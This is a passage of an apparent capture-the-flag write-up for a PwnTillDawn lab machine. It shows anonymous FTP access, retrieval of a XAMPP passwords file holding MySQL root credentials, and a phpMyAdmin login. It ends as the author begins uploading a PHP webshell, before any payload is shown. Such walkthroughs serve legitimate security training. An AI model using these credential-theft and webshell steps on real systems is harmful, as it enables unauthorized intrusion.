+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="enumeration">Enumeration</h2>
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+<p>Let&rsquo;s get a look at the <strong>FTP server</strong>, As it says that <strong>anonymous</strong> login is allowed from the <strong>Nmap</strong> scanner report.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">─$ ftp 10.150.150.212                                                                                      
+</span></span><span class="line"><span class="cl">Connected to 10.150.150.212.
+</span></span><span class="line"><span class="cl">220-Wellcome to Home Ftp Server!
+</span></span><span class="line"><span class="cl"><span class="m">220</span> Server ready.
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.150.150.212:pyke<span class="o">)</span>: anonymous
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Password required <span class="k">for</span> anonymous.
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl"><span class="m">230</span> User Anonymous logged in.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">help</span>
+</span></span><span class="line"><span class="cl">Commands may be abbreviated.  Commands are:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!               cr              ftp             macdef          msend           prompt          restart         sunique
+</span></span><span class="line"><span class="cl">$               debug           gate            mdelete         newer           proxy           rhelp           system
+</span></span><span class="line"><span class="cl">account         delete          get             mdir            nlist           put             rmdir           tenex
+</span></span><span class="line"><span class="cl">append          dir             glob            mget            nmap            <span class="nb">pwd</span>             rstatus         throttle
+</span></span><span class="line"><span class="cl">ascii           disconnect      <span class="nb">hash</span>            mkdir           ntrans          quit            runique         trace
+</span></span><span class="line"><span class="cl">bell            edit            <span class="nb">help</span>            mls             open            quote           send            <span class="nb">type</span>
+</span></span><span class="line"><span class="cl">binary          epsv            idle            mlsd            page            rate            sendport        <span class="nb">umask</span>
+</span></span><span class="line"><span class="cl">bye             epsv4           image           mlst            passive         rcvbuf          <span class="nb">set</span>             <span class="nb">unset</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span>            epsv6           lcd             mode            pdir            recv            site            usage
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span>              <span class="nb">exit</span>            less            modtime         pls             reget           size            user
+</span></span><span class="line"><span class="cl">cdup            features        lpage           more            pmlsd           remopts         sndbuf          verbose
+</span></span><span class="line"><span class="cl">chmod           fget            lpwd            mput            preserve        rename          status          xferbuf
+</span></span><span class="line"><span class="cl">close           form            ls              mreget          progress        reset           struct          ?
+</span></span><span class="line"><span class="cl">ftp&gt; dir
+</span></span><span class="line"><span class="cl"><span class="m">227</span> Entering Passive Mode <span class="o">(</span>10,150,150,212,192,51<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening data connection <span class="k">for</span> directory list.
+</span></span><span class="line"><span class="cl">drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">26</span>  <span class="m">2019</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">26</span>  <span class="m">2019</span> ..
+</span></span><span class="line"><span class="cl">drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">13</span>  <span class="m">2019</span> FLAG
+</span></span><span class="line"><span class="cl">-rw-rw-rw-   <span class="m">1</span> ftp      ftp        <span class="m">34419</span> Mar <span class="m">26</span>  <span class="m">2019</span> xampp-control.log
+</span></span><span class="line"><span class="cl">-rw-rw-rw-   <span class="m">1</span> ftp      ftp          <span class="m">881</span> Nov <span class="m">13</span>  <span class="m">2018</span> zen.txt
+</span></span><span class="line"><span class="cl"><span class="m">226</span> File sent ok
+</span></span><span class="line"><span class="cl">ftp&gt; get FLAG
+</span></span><span class="line"><span class="cl">local: FLAG remote: FLAG
+</span></span><span class="line"><span class="cl"><span class="m">227</span> Entering Passive Mode <span class="o">(</span>10,150,150,212,192,52<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="m">501</span> Cannot RETR. File not found
+</span></span><span class="line"><span class="cl">ftp&gt; get xampp-control.log
+</span></span><span class="line"><span class="cl">local: xampp-control.log remote: xampp-control.log
+</span></span><span class="line"><span class="cl"><span class="m">227</span> Entering Passive Mode <span class="o">(</span>10,150,150,212,192,54<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening data connection <span class="k">for</span> xampp-control.log.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>**********************************************************************************************<span class="p">|</span> <span class="m">34419</span>      102.16 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> File sent ok
+</span></span><span class="line"><span class="cl"><span class="m">34419</span> bytes received in 00:00 <span class="o">(</span>87.50 KiB/s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ftp&gt; get zen.txt
+</span></span><span class="line"><span class="cl">local: zen.txt remote: zen.txt
+</span></span><span class="line"><span class="cl"><span class="m">227</span> Entering Passive Mode <span class="o">(</span>10,150,150,212,192,55<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening data connection <span class="k">for</span> zen.txt.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>**********************************************************************************************<span class="p">|</span>   <span class="m">881</span>       36.68 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> File sent ok
+</span></span><span class="line"><span class="cl"><span class="m">881</span> bytes received in 00:00 <span class="o">(</span>10.28 KiB/s<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have managed to download two files which are <code>zen.txt</code> and <code>xampp-control.log</code>.</p>
+<p>Also, There is a directory called <code>FLAG</code> that has one of the flags in it!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl"><span class="m">227</span> Entering Passive Mode <span class="o">(</span>10,150,150,212,192,59<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening data connection <span class="k">for</span> directory list.
+</span></span><span class="line"><span class="cl">drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">26</span>  <span class="m">2019</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">26</span>  <span class="m">2019</span> ..
+</span></span><span class="line"><span class="cl">drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">13</span>  <span class="m">2019</span> FLAG
+</span></span><span class="line"><span class="cl">-rw-rw-rw-   <span class="m">1</span> ftp      ftp        <span class="m">34419</span> Mar <span class="m">26</span>  <span class="m">2019</span> xampp-control.log
+</span></span><span class="line"><span class="cl">-rw-rw-rw-   <span class="m">1</span> ftp      ftp          <span class="m">881</span> Nov <span class="m">13</span>  <span class="m">2018</span> zen.txt
+</span></span><span class="line"><span class="cl"><span class="m">226</span> File sent ok
+</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">cd</span> FLAG
+</span></span><span class="line"><span class="cl"><span class="m">250</span> CWD <span class="nb">command</span> successful. <span class="s2">&#34;/FLAG&#34;</span> is current directory.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl"><span class="m">227</span> Entering Passive Mode <span class="o">(</span>10,150,150,212,192,60<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening data connection <span class="k">for</span> directory list.
+</span></span><span class="line"><span class="cl">drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">13</span>  <span class="m">2019</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">13</span>  <span class="m">2019</span> ..
+</span></span><span class="line"><span class="cl">-rw-rw-rw-   <span class="m">1</span> ftp      ftp           <span class="m">40</span> Mar <span class="m">13</span>  <span class="m">2019</span> FLAG19.txt
+</span></span><span class="line"><span class="cl"><span class="m">226</span> File sent ok
+</span></span><span class="line"><span class="cl">ftp&gt; get FLAG19.txt
+</span></span><span class="line"><span class="cl">local: FLAG19.txt remote: FLAG19.txt
+</span></span><span class="line"><span class="cl"><span class="m">227</span> Entering Passive Mode <span class="o">(</span>10,150,150,212,192,62<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening data connection <span class="k">for</span> FLAG19.txt.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>**********************************************************************************************<span class="p">|</span>    <span class="m">40</span>      797.19 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> File sent ok
+</span></span><span class="line"><span class="cl"><span class="m">40</span> bytes received in 00:00 <span class="o">(</span>0.58 KiB/s<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s see what is in them?</p>
+<ol>
+<li>FLAG19.txt</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat FLAG19.txt 
+</span></span><span class="line"><span class="cl">a393b6fb540379e942b00XXXXXXXXXXXXXXXXXX
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>zen.txt</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat zen.txt   
+</span></span><span class="line"><span class="cl">The Zen of <span class="nv">Python</span>
+</span></span><span class="line"><span class="cl"><span class="o">==================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Beautiful is better than ugly.
+</span></span><span class="line"><span class="cl">Explicit is better than implicit.
+</span></span><span class="line"><span class="cl">Simple is better than complex.
+</span></span><span class="line"><span class="cl">Complex is better than complicated.
+</span></span><span class="line"><span class="cl">Flat is better than nested.
+</span></span><span class="line"><span class="cl">Sparse is better than dense.
+</span></span><span class="line"><span class="cl">Readability counts.
+</span></span><span class="line"><span class="cl">Special cases aren<span class="s1">&#39;t special enough to break the rules.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Although practicality beats purity.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Errors should never pass silently.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Unless explicitly silenced.
+</span></span></span><span class="line"><span class="cl"><span class="s1">In the face of ambiguity, refuse the temptation to guess.
+</span></span></span><span class="line"><span class="cl"><span class="s1">There should be one-- and preferably only one --obvious way to do it.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Although that way may not be obvious at first unless you&#39;</span>re Dutch.
+</span></span><span class="line"><span class="cl">Now is better than never.
+</span></span><span class="line"><span class="cl">Although never is often better than *right* now.
+</span></span><span class="line"><span class="cl">If the implementation is hard to explain, it<span class="s1">&#39;s a bad idea.
+</span></span></span><span class="line"><span class="cl"><span class="s1">If the implementation is easy to explain, it may be a good idea.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Namespaces are one honking great idea -- let&#39;</span>s <span class="k">do</span> more of those!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>xampp-control.log</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat xampp-control.log 
+</span></span><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      Initializing Control Panel
+</span></span><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      Windows Version: Windows <span class="m">7</span> Home Basic  64-bit
+</span></span><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      XAMPP Version: 5.6.38
+</span></span><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      Control Panel Version: 3.2.2  <span class="o">[</span> Compiled: Nov 12th <span class="m">2015</span> <span class="o">]</span>
+</span></span><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      You are not running with administrator rights! This will work <span class="k">for</span>
+</span></span><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      most application stuff but whenever you <span class="k">do</span> something with services
+</span></span><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      there will be a security dialogue or things will break! So think 
+</span></span><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      about running this application with administrator rights!
+</span></span><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      XAMPP Installation Directory: <span class="s2">&#34;c:\xampp\&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">3:11:25 PM  [main]      XAMPP Password Written in: &#34;</span>c:<span class="se">\x</span>ampp<span class="se">\p</span>asswords.txt<span class="s2">&#34;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>By looking into <code>xampp-control.log</code> we can see the below line which we can get with the <strong>FTP</strong> service.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">3:11:25 PM  <span class="o">[</span>main<span class="o">]</span>      XAMPP Password Written in: <span class="s2">&#34;c:\xampp\passwords.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; get <span class="s2">&#34;c:\xampp\passwords.txt&#34;</span>
+</span></span><span class="line"><span class="cl">local: c:<span class="se">\x</span>ampp<span class="se">\p</span>asswords.txt remote: c:<span class="se">\x</span>ampp<span class="se">\p</span>asswords.txt
+</span></span><span class="line"><span class="cl"><span class="m">227</span> Entering Passive Mode <span class="o">(</span>10,150,150,212,192,68<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening data connection <span class="k">for</span> c:<span class="se">\x</span>ampp<span class="se">\p</span>asswords.txt.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>**********************************************************************************************<span class="p">|</span>   <span class="m">816</span>       32.58 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> File sent ok
+</span></span><span class="line"><span class="cl"><span class="m">816</span> bytes received in 00:00 <span class="o">(</span>9.44 KiB/s<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Also, We can find the <code>FLAG20.txt</code> in the home directory of <strong>XAMPP server</strong> at <code>c:\xampp\</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; dir <span class="s2">&#34;c:\xampp\&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">227 Entering Passive Mode (10,150,150,212,192,74).
+</span></span></span><span class="line"><span class="cl"><span class="s2">150 Opening data connection for directory list.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">-rw-rw-rw-   1 ftp      ftp           40 Mar 13  2019 FLAG20.txt
+</span></span></span><span class="line"><span class="cl"><span class="s2">drw-rw-rw-   1 ftp      ftp            0 Nov 12  2018 mysql
+</span></span></span><span class="line"><span class="cl"><span class="s2">-rwxrwxrwx   1 ftp      ftp          481 Jun 07  2013 mysql_start.bat
+</span></span></span><span class="line"><span class="cl"><span class="s2">-rwxrwxrwx   1 ftp      ftp          220 Jun 07  2013 mysql_stop.bat
+</span></span></span><span class="line"><span class="cl"><span class="s2">-rw-rw-rw-   1 ftp      ftp          816 Mar 13  2019 passwords.txt
+</span></span></span><span class="line"><span class="cl"><span class="s2">drw-rw-rw-   1 ftp      ftp            0 Nov 12  2018 perl
+</span></span></span><span class="line"><span class="cl"><span class="s2">drw-rw-rw-   1 ftp      ftp            0 Nov 12  2018 php
+</span></span></span><span class="line"><span class="cl"><span class="s2">drw-rw-rw-   1 ftp      ftp            0 Nov 12  2018 phpMyAdmin
+</span></span></span><span class="line"><span class="cl"><span class="s2">226 File sent ok
+</span></span></span><span class="line"><span class="cl"><span class="s2">ftp&gt; get &#34;</span>c:<span class="se">\x</span>ampp<span class="se">\F</span>LAG20.txt<span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">local: c:\xampp\FLAG20.txt remote: c:\xampp\FLAG20.txt
+</span></span></span><span class="line"><span class="cl"><span class="s2">227 Entering Passive Mode (10,150,150,212,192,75).
+</span></span></span><span class="line"><span class="cl"><span class="s2">150 Opening data connection for c:\xampp\FLAG20.txt.
+</span></span></span><span class="line"><span class="cl"><span class="s2">100% |**********************************************************************************************|    40      271.26 KiB/s    00:00 ETA
+</span></span></span><span class="line"><span class="cl"><span class="s2">226 File sent ok
+</span></span></span><span class="line"><span class="cl"><span class="s2">40 bytes received in 00:00 (0.49 KiB/s)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Also, We can see that there is <code>phpMyAdmin</code> directory that we can investigate at the <strong>HTTP enumeration</strong> section.</p>
+<p>Now Let&rsquo;s see what is inside the <code>passwords.txt</code> and the <code>FLAG20.txt</code>?</p>
+<ol>
+<li>FLAG20.txt</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat c:<span class="se">\\</span>xampp<span class="se">\\</span>FLAG20.txt
+</span></span><span class="line"><span class="cl">a9435c140b6667cf2f24fXXXXXXXXXXXXXXXXXXX
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>passwords.txt</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">─$ cat <span class="s1">&#39;c:\xampp\passwords.txt&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">### XAMPP Default Passwords ###</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1<span class="o">)</span> MySQL <span class="o">(</span>phpMyAdmin<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   User: root
+</span></span><span class="line"><span class="cl">   Password:thebarrierbetween
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2<span class="o">)</span> FileZilla FTP:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="o">[</span> You have to create a new user on the FileZilla Interface <span class="o">]</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3<span class="o">)</span> Mercury <span class="o">(</span>not in the USB <span class="p">&amp;</span> lite version<span class="o">)</span>: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Postmaster: Postmaster <span class="o">(</span>postmaster@localhost<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   Administrator: Admin <span class="o">(</span>admin@localhost<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   User: newuser  
+</span></span><span class="line"><span class="cl">   Password: wampp 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4<span class="o">)</span> WEBDAV: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   User: xampp-dav-unsecure
+</span></span><span class="line"><span class="cl">   Password: ppmax2011
+</span></span><span class="line"><span class="cl">   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+</span></span><span class="line"><span class="cl">   For activation please comment out the httpd-dav.conf and
+</span></span><span class="line"><span class="cl">   following modules in the httpd.conf
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">   LoadModule dav_module modules/mod_dav.so
+</span></span><span class="line"><span class="cl">   LoadModule dav_fs_module modules/mod_dav_fs.so  
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">   Please <span class="k">do</span> not forget to refresh the WEBDAV authentification <span class="o">(</span>users and passwords<span class="o">)</span>.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, Now we have the credientials for the <code>phpMyAdmin</code> login at the webpage.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">MySQL <span class="o">(</span>phpMyAdmin<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">   User: root
+</span></span><span class="line"><span class="cl">   Password:thebarrierbetween
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s see it!</p>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<p><img src="/post/Django_PwnTillDawn/imgs/1.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="http"
+	
+	
+></p>
+<p>By looking at the webpage it looks as <strong>XAMPP Apache</strong> for hosting this website.</p>
+<p>Let&rsquo;s go to the <code>phpMyAdmin</code> directory!</p>
+<p><img src="/post/Django_PwnTillDawn/imgs/2.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="phpmyadmin"
+	
+	
+></p>
+<p>Let&rsquo;s log in using the credientials we&rsquo;ve found in the FTP server!</p>
+<p><img src="/post/Django_PwnTillDawn/imgs/3.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="phpmyadmin2"
+	
+	
+></p>
+<p>After we&rsquo;ve logged in we go to the <code>Databases</code> tab and we can see the <strong>flag18</strong> is there.</p>
+<p><img src="/post/Django_PwnTillDawn/imgs/4.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="databases"
+	
+	
+></p>
+<p>After that we can upload a <strong>webshell</strong> in the <strong>SQL</strong> tab using SQL quaries.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="php-webshell">PHP Webshell</h3>
+<p>I came through that <a class="link" href="https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/"  target="_blank" rel="noopener"
+    >article</a>that shows the steps we are going to follow in order to get a full reverse shell to the machine.</p>
+<ol>
+<li>
+<p>We go to the <strong>SQL</strong> tab.
+<img src="/post/Django_PwnTillDawn/imgs/5.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="SQL_tab"
+	
+	
+></p>
+</li>
+<li>
+<p>Then, We upload the <strong>PHP webshell</strong> backdoor.</p>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
